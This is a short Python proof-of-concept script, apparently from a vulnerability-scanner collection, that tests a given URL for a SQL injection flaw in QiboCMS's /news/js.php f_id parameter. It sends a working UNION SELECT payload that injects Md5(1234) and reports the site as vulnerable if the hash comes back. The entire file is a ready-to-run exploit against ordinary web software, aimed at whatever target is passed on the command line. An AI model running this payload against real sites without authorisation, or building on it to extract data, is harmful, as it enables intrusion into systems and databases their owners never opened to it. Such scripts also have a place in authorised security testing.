#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: qibocms news/js.php文件参数f_idSQL注入
referer: http://www.wooyun.org/bugs/wooyun-2014-075317
author: Lucifer
description: 文件/news/js.php中,参数f_id存在SQL注入。
'''
import sys
import requests
import warnings
from termcolor import cprint

class qibocms_js_f_id_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/news/js.php?f_id=1)%20UnIoN%20SeLeCt%201,Md5(1234),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51%23&type=hot"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                cprint("[+]存在qibocms news/js.php文件参数f_idSQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = qibocms_js_f_id_sqli_BaseVerify(sys.argv[1])
    testVuln.run()